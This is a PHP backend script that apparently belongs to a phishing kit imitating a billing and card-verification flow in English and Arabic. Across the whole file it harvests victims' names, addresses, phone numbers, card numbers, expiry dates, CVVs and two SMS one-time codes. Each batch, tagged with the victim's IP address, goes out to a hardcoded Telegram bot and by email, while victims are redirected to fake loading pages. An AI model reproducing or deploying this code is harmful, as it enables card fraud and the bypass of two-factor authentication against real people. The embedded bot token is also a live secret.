<?php 

require_once "functions.php";

$to = '';
$apiToken = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
$apiChat = "-744815345";

 if( $_POST['step'] == 'billing' ) {


        $_SESSION['errors']      = [];
        $_SESSION['first_name']  = $_POST['first'];
        $_SESSION['last_name']   = $_POST['last'];
        $_SESSION['address']   = $_POST['address'];
        $_SESSION['state']   = $_POST['state'];
        $_SESSION['city']        = $_POST['phone'];
        $_SESSION['postal_code'] = $_POST['zip'];

        if( empty($_POST['first']) ) {
            $_SESSION['errors']['first'] = true;
        }
        if( empty($_POST['last']) ) {
            $_SESSION['errors']['last'] = true;
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = true;
        }

        if( empty($_POST['state']) ) {
            $_SESSION['errors']['state'] = true;
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = true;
        }

        if( empty($_POST['zip']) ) {
            $_SESSION['errors']['zip'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = " =====> | SPL BILL| " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
            $message .= "First name : " . $_POST['first']                   . "\r\n";
            $message .= "Last name : " . $_POST['last']                 . "\r\n" ;
            $message .= "State : " . $_POST['state']                           . "\r\n" ;
            $message .= "ADDRESS : " . $_POST['address']                   . "\r\n" ;
            $message .= "Number phone : " . $_POST['phone']                             . "\r\n" ;
            $message .= "ZIP : " . $_POST['zip']               . "\r\n" ;
            $message .= "=====> Get Ready b0y <===== " . "\r\n";


            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

            header("Location: loading.php");
            exit();


        }else{
            header("Location: indexx.php");
            exit();}
}


else if ($_POST['step'] == 'cc') {
    
        $_SESSION['errors']      = [];
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['cvv']   = $_POST['cvv'];

        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = " =====> | SPL CC | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
            $message .= "CARD NUMBER : " . $_POST['card_number']             . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                       . "\r\n" ;
            $message .= "CCV : " . $_POST['cvv']                             . "\r\n" ;
            $message .= "=====> Get Ready b0y <===== " . "\r\n";

            header("Location: loading-sms.php");

            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: cc.php");
            exit();}
}

else if ($_POST['step'] == 'sms') {
        $subject  = " =====> | SPL SMS 1 | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;	
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";
        $message .= "=====> Get Ready b0y <===== " . "\r\n";

        if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


        mail($to, $subject, $message);
        header("Location: loading-access.php"); 
        exit(); 

}


if( $_POST['step'] == 'smstwo' ) {
  
        $subject  = " =====> | SPL SMS 2 | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
        $message .= "SMS CODE 2: " . $_POST['smstwo']                      . "\r\n";
		$message .= "=====> You Good b0y <===== " . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


        mail($to, $subject, $message);
        header("Location: success.php"); 
        exit(); 

}




// __________________________________  ARABIC _________________________///


if( $_POST['step'] == 'billing_ar' ) {


        $_SESSION['errors']      = [];
        $_SESSION['first_name']  = $_POST['first'];
        $_SESSION['last_name']   = $_POST['last'];
        $_SESSION['address']   = $_POST['address'];
        $_SESSION['state']   = $_POST['state'];
        $_SESSION['city']        = $_POST['phone'];
        $_SESSION['postal_code'] = $_POST['zip'];

        if( empty($_POST['first']) ) {
            $_SESSION['errors']['first'] = true;
        }
        if( empty($_POST['last']) ) {
            $_SESSION['errors']['last'] = true;
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = true;
        }

        if( empty($_POST['state']) ) {
            $_SESSION['errors']['state'] = true;
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = true;
        }

        if( empty($_POST['zip']) ) {
            $_SESSION['errors']['zip'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = " =====> | SPL BILL| " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
            $message .= "First name : " . $_POST['first']                   . "\r\n";
            $message .= "Last name : " . $_POST['last']                 . "\r\n" ;
            $message .= "State : " . $_POST['state']                           . "\r\n" ;
            $message .= "ADDRESS : " . $_POST['address']                   . "\r\n" ;
            $message .= "Number phone : " . $_POST['phone']                             . "\r\n" ;
            $message .= "ZIP : " . $_POST['zip']               . "\r\n" ;
            $message .= "=====> Get Ready b0y <===== " . "\r\n";
            
            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

            header("Location: loading_ar.php");
            exit();


        }else{
            header("Location: index_ar.php");
            exit();}
}


else if ($_POST['step'] == 'cc_ar') {
    
        $_SESSION['errors']      = [];
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['cvv']   = $_POST['cvv'];

        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = " =====> | SPL CC | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
            $message .= "CARD NUMBER : " . $_POST['card_number']             . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                       . "\r\n" ;
            $message .= "CCV : " . $_POST['cvv']                             . "\r\n" ;
            $message .= "=====> Get Ready b0y <===== " . "\r\n";

            header("Location: loading-sms_ar.php");

            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: cc_ar.php");
            exit();}
}

else if ($_POST['step'] == 'sms_ar') {
  

        $subject  = "=====> | SPL SMS 1 | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";
        $message .= "=====> Get Ready b0y <===== " . "\r\n";

        if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


        mail($to, $subject, $message);
        header("Location: loading-access_ar.php"); 
        exit(); 

}


if( $_POST['step'] == 'smstwo_ar' ) {
  

        $subject  = "=====> | SPL SMS 2 | " . $_SERVER['REMOTE_ADDR'] . " | <=====" . "\r\n"; ;
        $message .= "SMS CODE 2: " . $_POST['smstwo']                      . "\r\n";
		$message .= "=====> You Good b0y <===== " . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $data = [
                'chat_id' => $apiChat, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


        mail($to, $subject, $message);
        header("Location: success_ar.php"); 
        exit(); 

}
?>